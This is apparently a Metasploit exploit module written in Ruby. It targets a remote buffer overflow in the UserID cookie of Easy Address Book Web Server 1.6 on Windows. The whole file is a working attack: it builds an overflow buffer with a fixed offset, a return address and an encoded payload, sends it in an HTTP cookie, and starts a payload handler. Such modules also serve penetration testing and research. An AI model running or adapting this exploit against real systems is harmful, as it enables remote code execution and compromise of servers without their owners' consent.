##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy Address Book Web Server UserID BOF',
      'Description'    => %q{
          Easy Address Book Web Server 1.6 User ID Remote Buffer Overflow Exploits
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Tracy Turben', # Initial Discovery
        'ADEO Security' # Metasploit Porting
      ],
      'References'     => [
        ['OSVDB', '107242'],
        ['EDB', '37952']
      ],
      'Platform'       => ['win'],
      'Targets'        => [
        [ 'Windows Xp 32 Bit or Windows 7 64 Bit',
          {
            'Ret'    => 0x1001AFB8,
            'Offset' => 80
          }
        ]
      ],
      'Payload'        => {
        'Space'      => 900,
        'BadChars'   => "\x00\x0a\x0d"
      },
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 28 2015',
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptBool.new('SSL', [false, 'Use SSL', false])
      ],
      self.class
    )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'addrbook.ghp')
    )

    fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the server.") unless res

    if res.code == 200 &&
        res.body.include?('powered by Easy Address Book Web Server') &&
        res.headers['Server'].include?('Easy Address Book Web Server v3.0')
      return Exploit::CheckCode::Detected
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    vprint_status('Preparing Buffer...')
    buf = ''
    buf << 'A' * target['Offset']
    buf << [target.ret].pack('V')
    buf << payload.encoded
    vprint_status("Buffer made. Buffer length is #{buf.length} byte.")

    vprint_status('Sending request...')
    send_request_cgi(
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path, 'addrbook.ghp'),
      'cookie'    => "SESSIONID=1337;UserID=#{buf};PassWD=;",
    )

    handler
  end
end
